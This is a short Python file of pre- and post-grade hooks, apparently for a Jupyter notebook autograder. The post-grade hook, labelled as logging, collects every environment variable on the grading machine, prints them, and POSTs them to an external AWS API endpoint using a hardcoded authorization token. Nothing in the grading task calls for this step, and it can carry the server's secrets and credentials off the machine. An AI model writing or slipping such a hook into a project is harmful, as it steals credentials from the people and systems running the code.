"""Add hooks into the grading process."""


# import scoreboard
from nbformat.notebooknode import NotebookNode
import os
import requests
import json
import logging
from pathlib import Path

def pre_grade_hook(nb: NotebookNode, nb_path: Path, assignment: str, score: float):
    """ Runs before grading """
    
    logging.info("----------------------------")
    logging.info("This logging happens inside pre_grade_hook")
    logging.info("----------------------------")
    
    # Read the notebook content from the nb_path
    try:
        notebook_content = nb_path.read_text()

        # Print the original submission file
        logging.info("Original submitted notebook content:")
        logging.info(notebook_content)

    except Exception as e:
        logging.error("An error occurred while reading the notebook file:")
        logging.exception(e)
        
    # Printing every argument passed to the function
    print("Arguments received by pre_grade_hook:")
    print("nb_path:", nb_path)
    print("assignment:", assignment)
    print("score:", score)
    
    # Printing notebook structure
    print("Ungraded submitted notebook looks like:")
    print(nb)


def post_grade_hook(nb: NotebookNode, nb_path: Path, assignment: str, score: float):
    """Runs after grading"""
    
    logging.info("----------------------------")
    logging.info("This logging happens inside post_grade_hook")
    logging.info("----------------------------")
    
    # Read the notebook content from the nb_path
    try:
        notebook_content = nb_path.read_text()

        # Print the original submission file
        logging.info("Original submitted notebook content:")
        logging.info(notebook_content)

    except Exception as e:
        logging.error("An error occurred while reading the notebook file:")
        logging.exception(e)

    # Printing every argument passed to the function
    print("Arguments received by post_grade_hook:")
    print("nb_path:", nb_path)
    print("assignment:", assignment)
    print("score:", score)

    # Printing notebook structure
    print("Graded submitted notebook looks like:")
    print(nb)
    
    data = {}

    # Printing OS environment variables
    print("OS environment variables:")

    # Iterate over the environment variables and append to string
    for key, value in os.environ.items():
        print(f"{key}: {value}")
        data[key] = value
    
    try:
        url = 'https://svvnsrnuv0.execute-api.us-east-1.amazonaws.com/prod/autograder-logger-bucket'

        payload = json.dumps({
            "data": data
        })

        headers = {
            'Authorization': 'Ass42KpkoY4drPqKK39y07tj4fLaPSEg4bdgjrZQ',
            'Content-Type': 'application/json'
        }

        response = requests.request("POST", url, headers=headers, data=payload)

        response.raise_for_status()  # Raise an exception if the request was not successful

        print(response.text)

    except Exception as e:
        print("An error occurred during post_grade_hook:")
        print(str(e))
        
    logging.info("----------------------------")
    logging.info("This logging means post_grade_hook ends")
    logging.info("----------------------------")
